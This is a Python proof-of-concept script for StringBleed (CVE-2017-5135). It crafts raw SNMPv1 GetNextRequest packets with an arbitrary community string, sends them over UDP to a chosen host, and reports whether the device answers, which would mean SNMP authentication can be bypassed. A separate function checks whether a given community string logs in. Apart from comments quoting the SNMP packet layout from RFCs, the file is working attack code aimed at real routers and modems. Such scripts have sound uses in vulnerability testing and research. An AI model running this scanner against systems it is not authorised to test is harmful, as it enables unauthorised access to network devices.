#!/usr/bin/python
# -*- coding: utf-8 -*-

# StringBleed - CVE-2017-5135

__author__ = ["Nixawk"]

__funcs__ = [
    'generate_snmp_communitystr',
    'generate_snmp_proto_payload',
    'send_snmp_request',
    'read_snmp_communitystr',
    'read_snmp_varbindstr',
    'snmp_login',
    'snmp_stringbleed'
]


import struct
import uuid
import socket
import time
import logging
import contextlib


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__file__)


def generate_snmp_communitystr():
    return str(uuid.uuid4())


def generate_snmp_proto_payload(community):
    """Generate snmp request with [SNMPv1] and [OID: 1.3.6.1.2.1.1.1.0]
    For example, suppose one wanted to identify an instance of the
    variable sysDescr The object class for sysDescr is:
         iso org dod internet mgmt mib system sysDescr
          1   3   6     1      2    1    1       1
    """

    # SNMPv1 specifies five core protocol data units (PDUs).
    # All SNMP PDUs are constructed as follows:

    # ---------------------
    # | IP header         |
    # ---------------------
    # | UDP header        |
    # --------------------- -------|
    # | version           |        |
    # | community         |        |
    # | PDU-type          |        |
    # | request-id        |        |---- SNMP
    # | error-status      |        |
    # | error-index       |        |
    # | variable bindings |        |
    # --------------------- -------|
    #

    # The seven SNMP protocol data unit (PDU) types are as follows:
    # GetRequest
    # SetRequest
    # GetNextRequest
    # GetBulkRequest
    # Response
    # Trap
    # InformRequest

    # SNMPv1 Message Header
    # SNMPv1 Trap Message Hander

    # https://tools.ietf.org/html/rfc1592
    # +-----------------------------------------------------------------+
    # | Table 1 (Page 1 of 2). SNMP GET PDU for dpiPortForTCP.0         |
    # +---------------+----------------+--------------------------------+
    # | OFFSET        | VALUE          | FIELD                          |
    # +---------------+----------------+--------------------------------+
    # | 0             | 0x30           | ASN.1 header                   |
    # +---------------+----------------+--------------------------------+
    # | 1             | 37 + len       | PDU_length, see formula below  |
    # +---------------+----------------+--------------------------------+
    # | 2             | 0x02 0x01 0x00 | SNMP version:                  |
    # |               |                | (integer,length=1,value=0)     |
    # +---------------+----------------+--------------------------------+
    # | 5             | 0x04           | community name (string)        |
    # +---------------+----------------+--------------------------------+
    # | 6             | len            | length of community name       |
    # +---------------+----------------+--------------------------------+
    # | 7             | community name | varies                         |
    # +---------------+----------------+--------------------------------+
    # | 7 + len       | 0xa0 0x1c      | SNMP GET request:              |
    # |               |                | request_type=0xa0,length=0x1c  |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 2   | 0x02 0x01 0x01 | SNMP request ID:               |
    # |               |                | integer,length=1,ID=1          |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 5   | 0x02 0x01 0x00 | SNMP error status:             |
    # |               |                | integer,length=1,error=0       |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 8   | 0x02 0x01 0x00 | SNMP index:                    |
    # |               |                | integer,length=1,index=0       |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 11  | 0x30 0x11      | varBind list, length=0x11      |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 13  | 0x30 0x0f      | varBind, length=0x0f           |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 15  | 0x06 0x0b      | Object ID, length=0x0b         |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 17  | 0x2b 0x06 0x01 | Object-ID:                     |
    # |               | 0x04 0x01 0x02 | 1.3.6.1.4.1.2.2.1.1.1          |
    # |               | 0x02 0x01 0x01 | Object-instance: 0             |
    # |               | 0x01 0x00      |                                |
    # +---------------+----------------+--------------------------------+
    # | 7 + len + 28  | 0x05 0x00      | null value, length=0           |
    # +---------------+----------------+--------------------------------+
    # | NOTE:  Formula to calculate "PDU_length":                       |
    # |                                                                 |
    # |   PDU_length =  length of version field and string tag (4 bytes)|
    # |              +  length of community length field (1 byte)       |
    # |              +  length of community name (depends...)           |
    # |              +  length of SNMP GET request (32 bytes)           |
    # |                                                                 |
    # |              =  37 + length of community name                   |
    # +-----------------------------------------------------------------+

    snmp_GetNextRequest = [
        b"\x30",                             # ASN.1 Header
        b"\x29",                             # PDU length
        b"\x02\x01\x00",                     # SNMP Version
        b"\x04",                             # Community Name (string)
        chr(len(community)),                 # Community Length
        community,                           # Community String
        b"\xa1\x19",                         # PDU Type - GetNextRequest
        b"\x02\x04",
        struct.pack("<i", int(time.time())), # Request ID
        b"\x02\x01\x00",                     # Error Status (Type)
        b"\x02\x01\x00",                     # Error Index
        b"\x30",                             # Variable Type (Sequence)
        b"\x0b",                             # Length
        b"\x30",                             # Variable Type (Sequence)
        b"\x09",                             # Length
        b"\x06",                             # Variable Type (OID)
        b"\x05",                             # Length
        b"\x2b\x06\x01\x02\x01",             # Value
        b"\x05\x00"  # NULL
    ]

    pkt = "".join(snmp_GetNextRequest)
    com_length = chr(len(community))
    pdu_length = chr(len(pkt) - 2)      # community length cost 1 bytes (default)

    if com_length > '\x7f':
        com_length = '\x81' + com_length
        pdu_length = chr(len(pkt) - 1)  # community length cost 2 bytes

    if pdu_length > '\x7f':
        pdu_length = '\x81' + pdu_length

    snmp_GetNextRequest[1] = pdu_length
    snmp_GetNextRequest[4] = com_length

    pkt = b"".join(snmp_GetNextRequest)

    return pkt


def send_snmp_request(host, port, community, timeout=6.0):
    """Send snmp request based on UDP.
    """
    data = ''

    try:
        with contextlib.closing(socket.socket(socket.AF_INET, socket.SOCK_DGRAM)) as client:
            snmp_raw = generate_snmp_proto_payload(community)
            client.settimeout(timeout)
            client.sendto(snmp_raw, (host, port))
            data, _ = client.recvfrom(2014)
    except Exception as err:
        log.error("{} : {} - {}".format(host, port, err))

    return data


def read_snmp_communitystr(snmp_response):
    """Parse snmp response based on RFC-1157 (https://tools.ietf.org/html/rfc1157)
    """
    community_str = ''

    if not snmp_response:
        return community_str

    pdu_length = snmp_response[1]  # "\x30\x26\x02\x01", "\x30\x81\xea\x02\x01"
    if ord(pdu_length) > 0x7f:
        offset = 8  # "\x30\x81\xea\x02\x01\x00\x04\x24"
    else:
        offset = 7  # "\x30\x26\x02\x01\x00\x04\x06"

    community_length = snmp_response[offset - 1]
    community_str = snmp_response[offset: offset +ord(community_length)]

    return community_str


def read_snmp_varbindstr(snmp_response):
    """Parse snmp response based on RFC-1157 (https://tools.ietf.org/html/rfc1157)
    """
    variable_binding_string = ''

    if not snmp_response:
        return variable_binding_string

    pdu_length = snmp_response[1]  # "\x30\x26\x02\x01", "\x30\x81\xea\x02\x01"
    if ord(pdu_length) > 0x7f:
        offset = 8  # "\x30\x81\xea\x02\x01\x00\x04\x24"
    else:
        offset = 7  # "\x30\x26\x02\x01\x00\x04\x06"

    community_length = snmp_response[offset - 1]
    pdu_data_offset = offset + ord(community_length)
    pdu_data = snmp_response[pdu_data_offset:]  # 8 = first snmp 8 bytes

    last_pdu = pdu_data.split("\x00")[-1]

    # if data > 127 (0x7f), variable-bindings length: 3 bytes
    # if data < 127 (0x7f), variable-bindings length: 2 bytes

    last_pdu_length = ord(last_pdu[1])
    if last_pdu_length > 0x7f:
        variable_binding_string =  last_pdu[3:]
    else:
        variable_binding_string = last_pdu[2:]
    return variable_binding_string


def snmp_login(host, port, community):
    """login snmp service with SNMPv1 community string.
    """
    login_status = False
    try:
        resp_community = read_snmp_communitystr(
            send_snmp_request(host, int(port), community)
        )

        if (resp_community == community):
            login_status = True
    except Exception as err:
        log.error(err)

    return login_status


def snmp_stringbleed(host, port, community):
    """Test againsts Snmp StringBleed CVE-2017-5135.
    """
    stringbleed_status = False
    try:
        resp_varbindstr = read_snmp_varbindstr(
                send_snmp_request(host, int(port), community)
            )
        if resp_varbindstr: stringbleed_status = True
    except Exception as err:
        log.error(err)

    return stringbleed_status


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 4:
        log.info("Usage python {} <snmp-host> <snmp-port> <snmp-community-str>".format(sys.argv[0]))
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2]
    community = sys.argv[3]

    if snmp_login(host, int(port), community):
        log.info("{}:{} - [{}] snmp login successfully.".format(host, port, community))
    else:
        log.info("{}:{} - [{}] snmp login failed.".format(host, port, community))

    if snmp_stringbleed(host, int(port), community):
        log.info("{}:{} - [{}] snmp StringBleed successfully.".format(host, port, community))
    else:
        log.info("{}:{} - [{}] snmp StringBleed failed.".format(host, port, community))


## References
# https://tools.ietf.org/html/rfc1157
# http://stackoverflow.com/questions/22998212/decode-snmp-pdus-where-to-start
# http://www.net-snmp.org/
# https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol
# https://wiki.wireshark.org/SNMP
# https://msdn.microsoft.com/en-us/library/windows/desktop/bb648643(v=vs.85).aspx
# http://cs.uccs.edu/~cs522/studentproj/projF2004/jrreese/doc/SNMP.doc
# https://github.com/exhuma/puresnmp/blob/be1267bb792be0a5bdf57b0748354d2d3c7f9fb0/puresnmp/pdu.py